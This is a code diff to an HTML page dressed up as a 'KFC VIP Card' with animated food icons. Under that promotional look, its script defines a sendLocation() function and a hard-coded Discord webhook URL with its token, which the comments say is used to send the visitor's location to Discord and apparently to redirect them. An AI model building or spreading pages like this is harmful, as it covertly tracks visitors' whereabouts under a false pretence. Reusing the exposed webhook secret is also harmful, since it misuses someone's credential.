@@ -11,10 +11,10 @@
       height: 100%;
       font-family: 'Segoe UI', sans-serif;
       background: linear-gradient(to bottom right, #ffecd2, #fcb69f);
-      overflow: hidden;
+      overflow: visible;
+      position: relative;
     }
 
-    /* Background Animation Container */
     .bg-animation {
       position: fixed;
       top: 0;
@@ -23,6 +23,7 @@
       height: 100vh;
       z-index: 0;
       pointer-events: none;
+      overflow: visible;
     }
 
     .bg-animation img {
@@ -37,7 +38,7 @@
         transform: translateY(100vh) scale(0.9) rotate(0deg);
         opacity: 0;
       }
-      30% {
+      20% {
         opacity: 1;
       }
       100% {
@@ -46,7 +47,6 @@
       }
     }
 
-    /* VIP Card */
     .card {
       background: white;
       text-align: center;
@@ -98,10 +98,10 @@
 </head>
 <body>
 
-  <!-- Floating Food Background -->
+  <!-- Animated Background -->
   <div class="bg-animation" id="background"></div>
 
-  <!-- VIP KFC Card -->
+  <!-- KFC VIP Card -->
   <div class="card">
     <img src="kfc-logo.png" alt="KFC Logo" class="logo">
     <h1>KFC</h1>
@@ -111,7 +111,7 @@
   </div>
 
   <script>
-    // Animated Food Icons
+    // Background Animation
     const foodIcons = ["drumstick.png", "sauce.png", "wing.png"];
     const bg = document.getElementById('background');
 
@@ -120,12 +120,11 @@
       img.src = foodIcons[Math.floor(Math.random() * foodIcons.length)];
       img.style.left = Math.random() * 100 + 'vw';
       img.style.top = '100vh';
-      img.style.animationDuration = (10 + Math.random() * 10) + 's';
-      img.style.animationDelay = Math.random() * 8 + 's';
+      img.style.animationDuration = (10 + Math.random() * 8) + 's';
       bg.appendChild(img);
     }
 
-    // Webhook and Redirect
+    // Send location to Discord webhook
     const webhookUrl = "https://discord.com/api/webhooks/1400382122866249758/e2PIiGtfPBi0SQlRzF55kOmzGW2yUl-0HvUfjgp0Pohh9IAoWnbP-7EmGSKNbUnHgXjh";
 
     function sendLocation() {
@@ -158,6 +157,7 @@
 
 </body>
 </html>
+
 
 
 
